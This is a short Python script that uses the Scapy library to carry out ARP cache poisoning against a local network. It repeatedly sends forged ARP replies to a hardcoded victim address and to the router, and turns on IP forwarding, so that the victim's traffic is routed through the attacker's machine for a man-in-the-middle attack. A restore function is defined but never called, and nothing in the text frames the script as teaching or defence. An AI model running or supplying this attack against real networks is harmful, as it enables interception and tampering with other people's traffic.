from scapy.all import *
import time
import ip_forwarding

def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
    # our mac(which is not mentioned here) will be replaced on victim arp cache


def restore(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)

ip_forwarding.enable()

while True:
    victimIP="192.168.1.2"
    routerIP="192.168.1.1"
    victimMAC="00:26:b9:cf:7d:b3"
    routerMAC="08:26:b9:cf:7d:b8"
    poison(routerIP,victimIP,routerMAC,victimMAC)
    time.sleep(5)